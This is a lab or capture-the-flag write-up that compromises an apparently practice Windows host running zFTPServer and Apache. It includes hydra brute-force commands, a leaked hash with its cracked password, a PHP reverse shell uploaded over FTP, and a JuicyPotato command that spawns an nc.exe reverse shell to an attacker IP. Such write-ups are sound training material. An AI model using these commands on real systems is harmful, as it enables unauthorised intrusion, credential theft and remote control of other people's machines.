#Pwned! 
```IP
192.168.224.46
```
## Nmap
```
PORT     STATE SERVICE            REASON          VERSION
21/tcp   open  ftp                syn-ack ttl 125 zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                
| total 9680     
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Oct 24 14:39 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Aug 03 03:34 accounts
242/tcp  open  http               syn-ack ttl 125 Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8                                                                 
| http-methods:                                                                                                       
|_  Supported Methods: GET HEAD POST OPTIONS
| http-auth:                                  
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
3145/tcp open  zftp-admin         syn-ack ttl 125 zFTPServer admin
3389/tcp open  ssl/ms-wbt-server? syn-ack ttl 125
```

## Nmap UDP


# Enumeration
## FTP 21
zFTPServer v6.0
```
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -s 21 ftp://192.168.224.46
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241024103412.png?raw=true)
Found a hash in .htpasswd as admin:admin
```
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```
```
offsec:elite
```

we create reverse shell to upload since we have direct access to the apache server root directory
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241024112748.png?raw=true)
we upload it with ftp
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241024112843.png?raw=true)

we then navigate to http://target:242/run.php and listen on 4444 to get revshell
## FTP 3145
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241024103427.png?raw=true)

## HTTP 242
Bruteforce attempt 1
```
hydra -I -V -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -t 1 "http-get://192.168.224.46:242/:A=BASIC:F=401"
```

offsec:elite credentials work
trying to fuzz with them, but nothing came up
```
ffuf -request get.req -request-proto http -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -ac
```

## RDP
offsec:elite credentials not working
# PrivEsc

## Manual
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241024113324.png?raw=true)

```
.\jp.exe -l 1337 -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.45.235 443"
```
now we are root
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241024120433.png?raw=true)
## Automated

### Peass
### Mimikatz


